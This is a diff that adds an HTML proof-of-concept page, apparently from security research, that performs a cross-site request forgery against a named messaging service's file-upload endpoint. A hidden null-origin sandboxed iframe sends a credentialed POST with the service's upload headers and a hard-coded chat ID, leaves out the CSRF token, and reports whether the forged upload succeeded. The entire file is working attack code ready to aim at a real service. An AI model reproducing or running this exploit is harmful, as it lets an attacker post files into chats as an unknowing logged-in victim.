@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><title>PoC — CSRF Upload via null-origin iframe</title></head>
+<body>
+<h3>CSRF Upload — null origin (sandboxed iframe)</h3>
+<p>Attacker origin: <b id="host"></b> &nbsp;|&nbsp; Iframe origin: <b>null</b></p>
+<pre id="out" style="white-space:pre-wrap;word-break:break-all;margin-top:1em;"></pre>
+
+<iframe id="pwn" sandbox="allow-scripts" style="display:none"></iframe>
+
+<script>
+document.getElementById('host').textContent = location.origin;
+
+// ── CONFIG ──────────────────────────────────────────────────────────────────
+const TARGET_CHATID = "CT_1469007622159071968_3335514-GC";
+const FILE_NAME     = "important-invoice.txt";
+const FILE_BYTES    = "This file was uploaded without the victim's knowledge (PoC 05b).";
+// ────────────────────────────────────────────────────────────────────────────
+
+async function sha256hex(str) {
+    const buf    = new TextEncoder().encode(str);
+    const digest = await crypto.subtle.digest("SHA-256", buf);
+    return Array.from(new Uint8Array(digest)).map(b => b.toString(16).padStart(2, "0")).join("");
+}
+
+// Hash computed in parent (secure context) — passed as a ready string into the iframe.
+// This avoids relying on crypto.subtle inside the sandboxed srcdoc context.
+sha256hex(FILE_BYTES).then(function(refHash) {
+    var bodyAttrs = JSON.stringify({ reference_hash: refHash });
+    var fullBody  = bodyAttrs + FILE_BYTES;
+    var uploadId  = "attacker_" + Date.now();
+
+    var inner = '';
+    inner += 'var HOST='         + JSON.stringify("https://files.arattai.in") + ';';
+    inner += 'var TARGET_CHATID='+ JSON.stringify(TARGET_CHATID) + ';';
+    inner += 'var FILE_NAME='    + JSON.stringify(FILE_NAME)     + ';';
+    inner += 'var fullBody='     + JSON.stringify(fullBody)      + ';';
+    inner += 'var uploadId='     + JSON.stringify(uploadId)      + ';';
+    inner += 'var bodyAttrsLen=' + JSON.stringify(String(bodyAttrs.length)) + ';';
+    inner += 'var xhr=new XMLHttpRequest();';
+    inner += 'xhr.open("POST",HOST+"/webupload");';
+    inner += 'xhr.withCredentials=true;';                     // victim cookies sent (SameSite=None)
+    inner += 'xhr.setRequestHeader("X-Service","arattai");';
+    inner += 'xhr.setRequestHeader("X-Dfs-Service","zfs");';
+    inner += 'xhr.setRequestHeader("X-Streammode","1");';
+    inner += 'xhr.setRequestHeader("Upload-Id",uploadId);';
+    inner += 'xhr.setRequestHeader("File-Name",FILE_NAME);';
+    inner += 'xhr.setRequestHeader("X-Arattai-Chatids",TARGET_CHATID);';
+    inner += 'xhr.setRequestHeader("X-Arattai-Type","multi_recip");';
+    inner += 'xhr.setRequestHeader("X-Body_attr_size",bodyAttrsLen);';
+    inner += 'xhr.setRequestHeader("Content-Type","text/plain");';
+    // X-Zcsrf-Token intentionally omitted — testing whether server validates it
+    inner += 'xhr.onload=function(){parent.postMessage({type:"done",status:xhr.status,body:xhr.responseText},"*");};';
+    inner += 'xhr.onerror=function(){parent.postMessage({type:"err",msg:"request failed (CORS preflight blocked or network error)"},"*");};';
+    inner += 'xhr.send(fullBody);';
+    inner += 'parent.postMessage({type:"sent",uploadId:uploadId},"*");';
+
+    document.getElementById('pwn').srcdoc = '<script>' + inner + '<\/script>';
+});
+
+var log = document.getElementById('out');
+window.addEventListener('message', function(e) {
+    var d = e.data;
+    if (d.type === 'sent') {
+        log.textContent += '[SENT] POST /webupload  Upload-Id=' + d.uploadId + '  Origin: null\n';
+        log.textContent += '       X-Zcsrf-Token: (omitted — testing CSRF validation)\n';
+    } else if (d.type === 'done') {
+        log.textContent += '[RESPONSE] HTTP ' + d.status + '\n' + d.body + '\n';
+        if (d.status === 200) {
+            log.textContent += '\n[CONFIRMED] Upload accepted without CSRF token via null-origin iframe.\n';
+            log.textContent += '            Check chat ' + TARGET_CHATID + ' — file should appear as sent by victim.\n';
+            log.textContent += '            CLEANUP: delete the injected attachment from the chat after testing.\n';
+        } else {
+            log.textContent += '[RESULT] HTTP ' + d.status + ' — server rejected the request.\n';
+        }
+    } else if (d.type === 'err') {
+        log.textContent += '[BLOCKED] ' + d.msg + '\n';
+    }
+});
+</script>
+</body>
+</html>
